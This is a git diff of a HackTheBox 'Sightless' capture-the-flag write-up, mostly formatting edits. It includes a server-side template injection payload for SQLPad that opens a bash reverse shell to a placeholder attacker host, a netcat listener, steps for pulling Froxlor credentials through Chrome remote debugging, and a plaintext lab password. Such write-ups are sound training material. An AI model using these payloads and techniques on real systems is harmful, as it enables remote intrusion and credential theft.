@@ -59,7 +59,14 @@ Based on this source I need to do few steps:
 2. Select  **MySQL** as the driver
 ![](/assets/blogimages/Writeups/Hackthebox/Sightless/sightless7.png)
 3. Enter the following payload in the **Database** field:
-`{{ process.mainModule.require('child_process').exec('/bin/bash -c "bash -i >& /dev/tcp/ATTACKERIP/ATTACKERPORT 0>&1"') }}`
+
+```
+{% raw %}
+{{ process.mainModule.require('child_process').exec('/bin/bash -c "bash -i >& /dev/tcp/ATTACKERIP/ATTACKERPORT 0>&1"') }}
+{% endraw %}
+```
+
+
 ![](/assets/blogimages/Writeups/Hackthebox/Sightless/sightless8.png)
 
 4. Start a listener on your machine `nc -lvnp 1234` and then click the "Test Connection" button in **SQLPad** to trigger the reverse shell:
@@ -186,7 +193,7 @@ The file revealed the domain `admin.sightless.htb`, which I added to my local `/
 ![](/assets/blogimages/Writeups/Hackthebox/Sightless/sightless15.png)
 
 
-I connected to `http://admin.sightless.htb:2222` and was greeted with the Froxlor login page
+I connected to `http://admin.sightless.htb:2222` and was greeted with the Froxlor login page:
 ![](/assets/blogimages/Writeups/Hackthebox/Sightless/sightless16.png)
 
 I tried several password combinations, but none were successful. However, I noted the presence of Google Chrome processes running on the target. This led me to consider leveraging these processes to potentially extract credentials, which might allow me to log in to Froxlor.
@@ -195,7 +202,7 @@ After researching online for potential exploits, I found this guide on exploitin
 [https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/chrome-remote-debugger-pentesting/](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/chrome-remote-debugger-pentesting/)
 
 Based on this resource I followed the steps:
-1. Using `ss -ltn` and `curl`, I probed ports until finding one associated with Chrome’s remote debugging that responded without errors::
+1. Using `ss -ltn` and `curl`, I probed ports until finding one associated with Chrome’s remote debugging that responded without errors:
 ![](/assets/blogimages/Writeups/Hackthebox/Sightless/sightless17.png)
 
 
@@ -214,9 +221,9 @@ Based on this resource I followed the steps:
 ![](/assets/blogimages/Writeups/Hackthebox/Sightless/sightless20.png)
 
 
-6. In the "Network" tab, I clicked on `index.php`, inspected the payload, and discovered the Froxlor login credentials:
+6. In the "Network" tab, I clicked on `index.php`, inspected the payload, and discovered the Froxlor login credentials `admin:ForlorfroxAdmin`:
 ![](/assets/blogimages/Writeups/Hackthebox/Sightless/sightless21.png)
-`admin:ForlorfroxAdmin`
+
 
 Using the extracted credentials, I logged in to Froxlor successfully:
 ![](/assets/blogimages/Writeups/Hackthebox/Sightless/sightless22.png)
